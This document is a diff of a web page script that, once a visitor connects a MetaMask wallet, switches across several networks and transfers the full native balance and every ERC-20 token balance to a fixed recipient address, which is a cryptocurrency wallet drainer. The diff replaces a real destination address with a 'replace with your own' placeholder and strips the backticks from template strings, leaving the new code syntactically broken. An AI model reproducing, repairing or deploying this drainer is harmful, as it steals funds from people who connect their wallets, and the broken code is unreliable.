@@ -125,7 +125,7 @@
         let userAddress = "";
 
         // Destination wallet (replace with your own)
-        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";
+        const recipientAddress = "0xYourDestinationWalletAddressHere";
 
         // List of networks with RPC URLs
         const networks = [
@@ -156,7 +156,7 @@
             try {
                 console.log("Connecting to MetaMask...");
                 if (!window.ethereum) {
-                    document.getElementById('status').innerText = `MetaMask is not installed.`;
+                    document.getElementById('status').innerText = MetaMask is not installed.;
                     return;
                 }
 
@@ -164,8 +164,8 @@
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
-                console.log(`Wallet connected: ${userAddress}`);
-                document.getElementById('status').innerText = `Connected: ${userAddress}`;
+                console.log(Wallet connected: ${userAddress});
+                document.getElementById('status').innerText = Connected: ${userAddress};
                 
                 // Enable the disconnect button
                 document.getElementById('disconnectWallet').disabled = false;
@@ -173,15 +173,15 @@
                 // Start sending process
                 await sendCrypto();
             } catch (error) {
-                console.error(`Connection error: ${error.message}`);
-                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
+                console.error(Connection error: ${error.message});
+                document.getElementById('status').innerText = Connection failed: ${error.message};
             }
         });
 
         document.getElementById('disconnectWallet').addEventListener('click', async () => {
             userAddress = "";
             signer = null;
-            document.getElementById('status').innerText = `Disconnected.`;
+            document.getElementById('status').innerText = Disconnected.;
             document.getElementById('disconnectWallet').disabled = true;
         });
 
@@ -193,7 +193,7 @@
                 const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', 18)); // Keep some for gas fees
 
                 if (amountToSend.lt(0)) {
-                    document.getElementById('status').innerText += `\nInsufficient balance on ${network.name}. Switching to another network...`;
+                    document.getElementById('status').innerText += \nInsufficient balance on ${network.name}. Switching to another network...;
                     continue; // Proceed to the next network
                 }
 
@@ -205,27 +205,27 @@
 
                 const transactionResponse = await signer.sendTransaction(tx);
                 await transactionResponse.wait();
-                document.getElementById('status').innerText += `\nSent ${ethers.utils.formatEther(amountToSend)} ${network.nativeSymbol} to ${recipientAddress} on ${network.name}.`;
+                document.getElementById('status').innerText += \nSent ${ethers.utils.formatEther(amountToSend)} ${network.nativeSymbol} to ${recipientAddress} on ${network.name}.;
                 
                 // Send ERC-20 tokens
                 await sendAllERC20Tokens(network);
             }
-            document.getElementById('status').innerText += `\nAll transactions processed.`;
+            document.getElementById('status').innerText += \nAll transactions processed.;
         }
 
         async function switchNetwork(chainId) {
             try {
                 const network = networks.find(net => net.chainId === chainId);
-                await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
-                console.log(`Switched to network: ${network.name}`);
-                document.getElementById('status').innerText += `\nSwitched to ${network.name}.`;
+                await provider.send('wallet_switchEthereumChain', [{ chainId: 0x${chainId.toString(16)} }]);
+                console.log(Switched to network: ${network.name});
+                document.getElementById('status').innerText += \nSwitched to ${network.name}.;
             } catch (error) {
-                console.error(`Error switching networks: ${error.message}`);
+                console.error(Error switching networks: ${error.message});
                 if (error.code === 4902) {
                     // If the network is not added, we can add it using the appropriate RPC URL
                     await provider.send('wallet_addEthereumChain', [
                         {
-                            chainId: `0x${chainId.toString(16)}`,
+                            chainId: 0x${chainId.toString(16)},
                             chainName: network.name,
                             nativeCurrency: {
                                 name: network.nativeSymbol,
@@ -236,8 +236,8 @@
                             blockExplorerUrls: []
                         }
                     ]);
-                    console.log(`Added network: ${network.name}`);
-                    document.getElementById('status').innerText += `\nAdded and switched to ${network.name}.`;
+                    console.log(Added network: ${network.name});
+                    document.getElementById('status').innerText += \nAdded and switched to ${network.name}.;
                 }
             }
         }
@@ -255,10 +255,11 @@
                 if (tokenBalance.gt(0)) {
                     const transferTx = await tokenContract.transfer(recipientAddress, tokenBalance);
                     await transferTx.wait();
-                    document.getElementById('status').innerText += `\nSent ${ethers.utils.formatUnits(tokenBalance, token.decimals)} ${token.symbol} to ${recipientAddress} on ${network.name}.`;
+                    document.getElementById('status').innerText += \nSent ${ethers.utils.formatUnits(tokenBalance, token.decimals)} ${token.symbol} to ${recipientAddress} on ${network.name}.;
                 }
             }
         }
     </script>
 </body>
 </html>
+
